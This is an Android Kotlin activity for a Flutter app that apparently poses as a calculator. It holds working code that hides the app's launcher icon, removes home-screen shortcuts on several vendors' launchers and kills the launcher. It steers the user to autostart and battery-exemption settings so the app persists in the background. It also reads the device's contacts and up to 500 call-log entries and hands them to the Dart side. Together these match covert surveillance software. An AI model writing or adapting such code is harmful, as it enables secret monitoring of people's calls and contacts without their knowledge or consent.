package come.tshah.app

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Bundle
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity : FlutterActivity() {
    private val channel = "counter/oem"

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, channel)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "isFirstRun" -> {
                        // Uses commit() — synchronous write, guaranteed before process kill
                        val sp = getSharedPreferences("calc_app_prefs", MODE_PRIVATE)
                        val isFirst = !sp.getBoolean("has_run_once", false)
                        if (isFirst) {
                            sp.edit().putBoolean("has_run_once", true).commit()
                        }
                        result.success(isFirst)
                    }
                    "openAutoStart"       -> result.success(openAutoStart())
                    "openBackgroundPower" -> result.success(openBackgroundPower())
                    "getContacts"         -> result.success(getContacts())
                    "getCallLogs"         -> result.success(getCallLogs())
                    "openGoogle" -> {
                        try {
                            startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://www.google.com")).apply {
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            })
                            result.success(true)
                        } catch (_: Exception) {
                            result.success(false)
                        }
                    }
                    "openAppInfo" -> {
                        try {
                            startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                                data = Uri.parse("package:$packageName")
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            })
                            result.success(true)
                        } catch (_: Exception) {
                            result.success(false)
                        }
                    }
                    "hideIcon"            -> {
                        try {
                            val launcherCn = ComponentName(packageName, "$packageName.LauncherAlias")
                            val infoCn = ComponentName(packageName, "$packageName.INFO")
                            val pm = applicationContext.packageManager

                            // Step 1: Enable INFO alias (keeps app reachable)
                            pm.setComponentEnabledSetting(
                                infoCn,
                                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                                PackageManager.DONT_KILL_APP
                            )

                            // Step 2: Disable LAUNCHER alias (standard hide)
                            pm.setComponentEnabledSetting(
                                launcherCn,
                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                PackageManager.DONT_KILL_APP
                            )

                            // Step 3: Remove cached home screen shortcuts
                            // Vivo/Oppo/Realme launchers keep shortcuts in their own DB
                            removeHomeShortcut(launcherCn)

                            // Step 4: Kill launcher while WE are still foreground
                            restartLauncher()

                            val launcherState = pm.getComponentEnabledSetting(launcherCn)
                            val infoState = pm.getComponentEnabledSetting(infoCn)
                            val success = (launcherState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                                    && infoState == PackageManager.COMPONENT_ENABLED_STATE_ENABLED)
                            android.util.Log.d("HideApp", "hideIcon success=$success")

                            result.success(success)
                        } catch (e: Exception) {
                            android.util.Log.e("HideApp", "hideIcon failed", e)
                            result.error("HIDE_FAILED", e.message, null)
                        }
                    }
                    "finishApp" -> {
                        result.success(true)
                        // Post finish() AFTER result is dispatched to Dart
                        android.os.Handler(mainLooper).post {
                            finish()
                            android.os.Handler(mainLooper).postDelayed({
                                finishAndRemoveTask()
                            }, 300)
                        }
                    }
                    else                  -> result.notImplemented()
                }
            }
    }

    // ── Auto-start / protected apps ──────────────────────────────────────────
    private fun openAutoStart(): Boolean {
        val manufacturer = android.os.Build.MANUFACTURER.lowercase()
        val candidates: List<ComponentName> = when {
            manufacturer.contains("vivo") || manufacturer.contains("iqoo") -> listOf(
                ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"),
                ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"),
                ComponentName("com.iqoo.secure", "com.iqoo.secure.safeguard.PurviewTabActivity"),
                ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.PurviewTabActivity"),
            )
            manufacturer.contains("xiaomi") || manufacturer.contains("redmi") || manufacturer.contains("poco") -> listOf(
                ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"),
            )
            manufacturer.contains("oppo") || manufacturer.contains("realme") -> listOf(
                ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity"),
                ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity"),
                ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity"),
            )
            manufacturer.contains("oneplus") -> listOf(
                ComponentName("com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity"),
            )
            manufacturer.contains("huawei") || manufacturer.contains("honor") -> listOf(
                ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"),
                ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity"),
            )
            else -> emptyList()
        }

        if (candidates.isEmpty()) return false

        for (component in candidates) {
            try {
                startActivity(Intent().apply {
                    this.component = component
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
                return true
            } catch (_: Exception) {}
        }

        return try {
            startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
            true
        } catch (_: Exception) { false }
    }

    // ── Background power / Smart Battery management ───────────────────────────
    private fun openBackgroundPower(): Boolean {
        val manufacturer = android.os.Build.MANUFACTURER.lowercase()

        val candidates: List<ComponentName> = when {
            manufacturer.contains("vivo") || manufacturer.contains("iqoo") -> listOf(
                ComponentName("com.vivo.powercontroller",
                    "com.vivo.powercontroller.activity.PowerUsageDetailActivity"),
                ComponentName("com.vivo.powercontroller",
                    "com.vivo.powercontroller.activity.AppPowerManagerActivity"),
                ComponentName("com.iqoo.secure",
                    "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager"),
                ComponentName("com.vivo.permissionmanager",
                    "com.vivo.permissionmanager.activity.PurviewTabActivity"),
            )
            manufacturer.contains("xiaomi") || manufacturer.contains("redmi") || manufacturer.contains("poco") -> listOf(
                ComponentName("com.miui.powerkeeper",
                    "com.miui.powerkeeper.ui.HiddenAppsConfigActivity"),
                ComponentName("com.miui.securitycenter",
                    "com.miui.permcenter.autostart.AutoStartManagementActivity"),
            )
            manufacturer.contains("oppo") || manufacturer.contains("realme") -> listOf(
                ComponentName("com.coloros.safecenter",
                    "com.coloros.safecenter.permission.startup.StartupAppListActivity"),
                ComponentName("com.oppo.safe",
                    "com.oppo.safe.permission.startup.StartupAppListActivity"),
            )
            manufacturer.contains("huawei") || manufacturer.contains("honor") -> listOf(
                ComponentName("com.huawei.systemmanager",
                    "com.huawei.systemmanager.optimize.process.ProtectActivity"),
            )
            manufacturer.contains("samsung") -> listOf(
                ComponentName("com.samsung.android.lool",
                    "com.samsung.android.lool.feature.battery.ui.BatterySleepingAppsActivity"),
            )
            else -> emptyList()
        }

        for (component in candidates) {
            try {
                startActivity(Intent().apply {
                    this.component = component
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
                return true
            } catch (_: Exception) {}
        }

        try {
            startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
            return true
        } catch (_: Exception) {}

        return try {
            startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
            true
        } catch (_: Exception) { false }
    }

    // ── Read device contacts ─────────────────────────────────────────────────
    private fun getContacts(): List<Map<String, String?>> {
        val contacts = mutableListOf<Map<String, String?>>()
        var cursor: Cursor? = null
        try {
            cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                ),
                null,
                null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )
            cursor?.let {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val phoneIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) {
                    val name = if (nameIdx >= 0) it.getString(nameIdx) else null
                    val phone = if (phoneIdx >= 0) it.getString(phoneIdx) else null
                    contacts.add(mapOf("name" to (name ?: ""), "phone" to (phone ?: "")))
                }
            }
        } catch (_: Exception) {
        } finally {
            cursor?.close()
        }
        return contacts
    }

    // ── Home screen shortcut removal (Vivo / Oppo / Realme / Samsung) ─────
    private fun removeHomeShortcut(launcherCn: ComponentName) {
        val appLabel = applicationInfo.loadLabel(packageManager).toString()
        val launchIntent = Intent(Intent.ACTION_MAIN).apply {
            addCategory(Intent.CATEGORY_LAUNCHER)
            component = launcherCn
        }

        // Generic Android broadcast (works on many launchers)
        val actions = listOf(
            "com.android.launcher.action.UNINSTALL_SHORTCUT",
            // Vivo
            "com.bbk.launcher2.action.UNINSTALL_SHORTCUT",
            "com.vivo.launcher.action.UNINSTALL_SHORTCUT",
            // Samsung
            "com.sec.android.app.launcher.action.UNINSTALL_SHORTCUT",
            // Xiaomi
            "com.miui.home.action.UNINSTALL_SHORTCUT",
            // Oppo / Realme
            "com.oppo.launcher.action.UNINSTALL_SHORTCUT",
        )
        for (action in actions) {
            try {
                sendBroadcast(Intent(action).apply {
                    putExtra(Intent.EXTRA_SHORTCUT_NAME, appLabel)
                    putExtra(Intent.EXTRA_SHORTCUT_INTENT, launchIntent)
                    putExtra("duplicate", false)
                })
            } catch (_: Exception) {}
        }
    }

    // ── Force launcher to restart and re-read its app list ──────────────────
    private fun restartLauncher() {
        try {
            val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_HOME)
            }
            val launcherPkg = packageManager.resolveActivity(
                homeIntent, PackageManager.MATCH_DEFAULT_ONLY
            )?.activityInfo?.packageName ?: return

            // Kill launcher process (works on most devices)
            val am = getSystemService(android.app.ActivityManager::class.java)
            am?.killBackgroundProcesses(launcherPkg)
            android.util.Log.d("HideApp", "Killed launcher: $launcherPkg")

            // Samsung One UI 14 + Vivo fix: navigate to home screen after a short
            // delay so the launcher re-reads component states on restart
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                try {
                    startActivity(Intent(Intent.ACTION_MAIN).apply {
                        addCategory(Intent.CATEGORY_HOME)
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    })
                } catch (_: Exception) {}
            }, 300)
        } catch (e: Exception) {
            android.util.Log.d("HideApp", "Launcher kill failed: ${e.message}")
        }
    }


    // ── Read call logs (last 500) ────────────────────────────────────────────
    private fun getCallLogs(): List<Map<String, Any?>> {
        val logs = mutableListOf<Map<String, Any?>>()
        var cursor: Cursor? = null
        try {
            cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.DATE,
                ),
                null,
                null,
                CallLog.Calls.DATE + " DESC"
            )
            cursor?.let {
                val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val numberIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val durationIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                var count = 0
                while (it.moveToNext() && count < 500) {
                    val name = if (nameIdx >= 0) it.getString(nameIdx) else null
                    val number = if (numberIdx >= 0) it.getString(numberIdx) else null
                    val typeInt = if (typeIdx >= 0) it.getInt(typeIdx) else 0
                    val duration = if (durationIdx >= 0) it.getLong(durationIdx) else 0L
                    val date = if (dateIdx >= 0) it.getLong(dateIdx) else 0L

                    val typeStr = when (typeInt) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE   -> "missed"
                        CallLog.Calls.REJECTED_TYPE -> "rejected"
                        else                        -> "unknown"
                    }

                    val dateFormatted = if (date > 0) {
                        SimpleDateFormat("MMM d, yyyy h:mm a", Locale.getDefault())
                            .format(Date(date))
                    } else ""

                    var displayName = name ?: ""
                    if (displayName.isEmpty() && !number.isNullOrEmpty()) {
                        try {
                            val uri = android.net.Uri.withAppendedPath(
                                ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                                android.net.Uri.encode(number)
                            )
                            val nameCur = contentResolver.query(uri,
                                arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME),
                                null, null, null)
                            nameCur?.use {
                                if (it.moveToFirst()) {
                                    val idx = it.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME)
                                    if (idx >= 0) displayName = it.getString(idx) ?: ""
                                }
                            }
                        } catch (_: Exception) {}
                    }

                    logs.add(
                        mapOf(
                            "name" to displayName,
                            "number" to (number ?: ""),
                            "type" to typeStr,
                            "duration" to duration,
                            "date" to dateFormatted,
                        )
                    )
                    count++
                }
            }
        } catch (_: Exception) {
        } finally {
            cursor?.close()
        }
        return logs
    }
}
